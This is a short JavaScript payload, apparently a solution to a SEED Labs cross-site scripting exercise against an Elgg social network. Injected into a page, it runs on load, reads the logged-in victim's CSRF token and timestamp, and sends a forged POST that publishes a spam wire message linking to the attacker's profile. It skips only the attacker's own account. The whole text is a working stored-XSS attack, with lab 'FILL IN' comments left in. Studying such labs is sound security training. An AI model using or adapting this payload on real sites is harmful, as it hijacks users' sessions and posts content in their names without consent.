<script type="text/javascript">
	window.onload = function(){
        //JavaScript code to access user name, user guid, Time Stamp __elgg_ts
        //and Security Token __elgg_token
        var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
        var token="__elgg_token="+elgg.security.token.__elgg_token;
        //Construct the content of your url.
        var id = elgg.get_logged_in_user_guid();
        var sendurl="http://www.seed-server.com/action/thewire/add"; //FILL IN
        var body = "To earn 12 USD%2FHour(!), visit now http:%2F%2Fwww.seed-server.com%2Fprofile%2Fsamy"
        var content= token + ts + "&body=" + body; //FILL IN
        
        if(id !== 59)
        {
            //Create and send Ajax request to modify profile
            var Ajax=null;
            Ajax=new XMLHttpRequest();
            Ajax.open("POST",sendurl,true);
            Ajax.setRequestHeader("Host","www.seed-server.com");
            Ajax.setRequestHeader("Content-Type",
            "application/x-www-form-urlencoded");
            Ajax.send(content);
        }
	}
</script>
